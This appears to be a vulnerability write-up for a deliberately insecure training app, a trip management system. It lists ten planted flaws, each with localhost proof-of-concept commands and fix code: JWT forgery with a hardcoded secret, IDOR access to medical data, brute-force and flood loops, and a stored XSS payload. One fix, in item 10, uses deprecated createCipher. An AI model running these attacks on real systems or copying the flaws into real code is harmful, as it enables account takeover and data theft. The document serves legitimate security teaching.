# Security Vulnerabilities - Trip Management System

## Intentional Vulnerabilities for Testing

This document lists the intentional security vulnerabilities built into the system for educational penetration testing purposes.

---

## 1. Weak Password Validation

**Severity**: Medium  
**Type**: Authentication  
**Location**: `backend/routes/auth.js` - `/api/auth/register`

### Vulnerability
The system accepts passwords as short as 1 character with no complexity requirements.

### Proof of Concept
```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"1","firstName":"Test","lastName":"User"}'
```

### Impact
- Users can set extremely weak passwords
- Passwords are vulnerable to brute force attacks
- No protection against dictionary attacks

### Remediation
```javascript
// Add password strength validation
const validatePassword = (password) => {
  const minLength = 8;
  const hasUppercase = /[A-Z]/.test(password);
  const hasLowercase = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[!@#$%^&*]/.test(password);
  
  return password.length >= minLength && 
         hasUppercase && hasLowercase && 
         hasNumber && hasSpecial;
};
```

---

## 2. Horizontal Privilege Escalation

**Severity**: High  
**Type**: Authorization  
**Location**: `backend/routes/members.js` - `GET /api/members/:id`

### Vulnerability
Any authenticated user can view any other member's profile, including confidential information (medical info, home address, fitness notes).

### Proof of Concept
```bash
# Login as member
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"member@example.com","password":"password123"}' | jq -r '.token')

# Access another member's confidential info
curl -X GET http://localhost:3000/api/members/3 \
  -H "Authorization: Bearer $TOKEN"
```

### Impact
- Exposure of sensitive personal information
- Privacy violation
- Potential identity theft
- HIPAA/GDPR violations

### Remediation
```javascript
// Only allow users to view:
// 1. Their own profile
// 2. Profiles of members in their events (for trip leaders)
// 3. All profiles (for admins)

if (req.user.user_id !== parseInt(req.params.id) && 
    req.user.role !== 'system_admin') {
  // Check if user is trip leader of member's events
  const isLeaderOfMember = await checkIfLeaderOfMember(req.user.user_id, req.params.id);
  if (!isLeaderOfMember) {
    return res.status(403).json({ error: 'Unauthorized' });
  }
}
```

---

## 3. Weak JWT Secret

**Severity**: Critical  
**Type**: Authentication  
**Location**: `backend/middleware/auth.js`

### Vulnerability
The default JWT secret is 'your-secret-key', which is easily guessable and hardcoded in the code.

### Proof of Concept
```bash
# Decode any JWT token at jwt.io
# You'll see the secret is 'your-secret-key'

# Create a forged token with admin role
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { user_id: 1, email: 'hacker@example.com', role: 'system_admin' },
  'your-secret-key',
  { expiresIn: '24h' }
);
console.log(token);
"

# Use forged token to access admin endpoints
curl -X GET http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

### Impact
- Complete authentication bypass
- Ability to forge tokens for any user
- Privilege escalation to admin
- Full system compromise

### Remediation
```javascript
// Use strong random secret from environment
const JWT_SECRET = process.env.JWT_SECRET;

if (!JWT_SECRET || JWT_SECRET === 'your-secret-key') {
  throw new Error('JWT_SECRET must be set to a strong random value');
}

// Generate strong secret
// openssl rand -base64 32
```

---

## 4. No Brute Force Protection

**Severity**: High  
**Type**: Authentication  
**Location**: `backend/routes/auth.js` - `/api/auth/login`

### Vulnerability
No rate limiting or account lockout after failed login attempts.

### Proof of Concept
```bash
# Attempt 1000 logins with wrong password
for i in {1..1000}; do
  curl -s -X POST http://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@example.com","password":"wrongpassword"}' > /dev/null
done

# Account is still accessible
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"password123"}'
```

### Impact
- Brute force password attacks possible
- Account takeover risk
- Denial of service

### Remediation
```javascript
// Implement rate limiting
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later'
});

router.post('/login', loginLimiter, async (req, res, next) => {
  // ... login logic
});
```

---

## 5. Information Disclosure in Error Messages

**Severity**: Low  
**Type**: Information Disclosure  
**Location**: `backend/middleware/errorHandler.js`

### Vulnerability
Error messages may reveal system details like database structure or SQL errors.

### Proof of Concept
```bash
# Trigger various errors and observe responses
curl -X GET http://localhost:3000/api/events/invalid
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@example.com","password":"test"}'
```

### Impact
- Information leakage
- Helps attackers understand system architecture
- Can reveal database structure

### Remediation
```javascript
// Return generic error messages to users
const errorHandler = (err, req, res, next) => {
  console.error('Error:', err); // Log full error internally
  
  // Return generic message to user
  res.status(err.status || 500).json({
    error: 'An error occurred. Please try again later.'
  });
};
```

---

## 6. No HTTPS Enforcement

**Severity**: Critical  
**Type**: Transport Security  
**Location**: All endpoints

### Vulnerability
System doesn't enforce HTTPS, allowing man-in-the-middle attacks.

### Proof of Concept
```bash
# All traffic is sent over HTTP (not HTTPS)
curl -v http://localhost:3000/api/auth/login
# Notice: no TLS/SSL encryption
```

### Impact
- Tokens can be intercepted
- Passwords can be captured
- Session hijacking possible
- Complete data compromise

### Remediation
```javascript
// Enforce HTTPS in production
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
      next();
    }
  });
}
```

---

## 7. No Input Validation/Sanitization

**Severity**: High  
**Type**: Input Validation  
**Location**: All endpoints

### Vulnerability
User input is not validated or sanitized, allowing XSS and injection attacks.

### Proof of Concept
```bash
# XSS in event title
curl -X POST http://localhost:3000/api/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"<script>alert(\"XSS\")</script>","description":"test","event_date":"2026-07-01T10:00:00","capacity":10}'

# Check if script is stored and executed in frontend
```

### Impact
- Cross-site scripting attacks
- Session hijacking via XSS
- Malware injection
- Data theft

### Remediation
```javascript
// Validate and sanitize input
const { body, validationResult } = require('express-validator');

router.post('/events', [
  body('title').trim().isLength({ min: 1, max: 255 }).escape(),
  body('description').trim().isLength({ max: 1000 }).escape(),
  body('capacity').isInt({ min: 1, max: 10000 })
], async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // ... rest of logic
});
```

---

## 8. No Audit Logging

**Severity**: Medium  
**Type**: Logging & Monitoring  
**Location**: All endpoints

### Vulnerability
No audit trail of user actions, making it impossible to detect or investigate attacks.

### Proof of Concept
```bash
# Perform sensitive actions (delete user, change role, etc.)
# No logs are created to track who did what and when
```

### Impact
- No accountability
- Impossible to detect attacks
- Compliance violations
- Forensic analysis impossible

### Remediation
```javascript
// Create audit log for sensitive operations
const auditLog = async (userId, action, resource, details) => {
  await pool.execute(
    'INSERT INTO audit_logs (user_id, action, resource, details, timestamp) VALUES (?, ?, ?, ?, NOW())',
    [userId, action, resource, JSON.stringify(details)]
  );
};

// Use in sensitive endpoints
await auditLog(req.user.user_id, 'DELETE_USER', 'users', { deleted_user_id: userId });
```

---

## 9. No Rate Limiting

**Severity**: Medium  
**Type**: Denial of Service  
**Location**: All endpoints

### Vulnerability
No rate limiting on API endpoints, allowing DoS attacks.

### Proof of Concept
```bash
# Send thousands of requests
for i in {1..10000}; do
  curl -s http://localhost:3000/api/events > /dev/null &
done
```

### Impact
- Denial of service
- Resource exhaustion
- Service unavailability

### Remediation
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', limiter);
```

---

## 10. Unencrypted Sensitive Data in Database

**Severity**: High  
**Type**: Data Protection  
**Location**: `members` table

### Vulnerability
Medical information and home addresses are stored in plaintext in the database.

### Proof of Concept
```bash
# Connect to database
mysql -h localhost -P 3307 -u app_user -ppassword trip_app

# Query sensitive data
SELECT email, medical_info, home_address FROM members;
```

### Impact
- Privacy violation
- HIPAA/GDPR violations
- Identity theft
- Blackmail potential

### Remediation
```javascript
// Encrypt sensitive fields
const crypto = require('crypto');

const encryptField = (data) => {
  const cipher = crypto.createCipher('aes-256-cbc', process.env.ENCRYPTION_KEY);
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
};

const decryptField = (encrypted) => {
  const decipher = crypto.createDecipher('aes-256-cbc', process.env.ENCRYPTION_KEY);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
};
```

---

## Summary of Vulnerabilities

| # | Vulnerability | Severity | Type | Status |
|---|---|---|---|---|
| 1 | Weak Password Validation | Medium | Authentication | Intentional |
| 2 | Horizontal Privilege Escalation | High | Authorization | Intentional |
| 3 | Weak JWT Secret | Critical | Authentication | Intentional |
| 4 | No Brute Force Protection | High | Authentication | Intentional |
| 5 | Information Disclosure | Low | Information Disclosure | Intentional |
| 6 | No HTTPS Enforcement | Critical | Transport Security | Intentional |
| 7 | No Input Validation | High | Input Validation | Intentional |
| 8 | No Audit Logging | Medium | Logging | Intentional |
| 9 | No Rate Limiting | Medium | DoS | Intentional |
| 10 | Unencrypted Sensitive Data | High | Data Protection | Intentional |

---

## Testing Checklist

- [ ] Test weak password validation
- [ ] Test horizontal privilege escalation
- [ ] Test JWT token forgery
- [ ] Test brute force attacks
- [ ] Test information disclosure
- [ ] Test HTTPS enforcement
- [ ] Test input validation
- [ ] Test audit logging
- [ ] Test rate limiting
- [ ] Test database encryption

---

## Notes

These vulnerabilities are intentionally included for educational purposes. In a production system, all of these should be fixed before deployment.
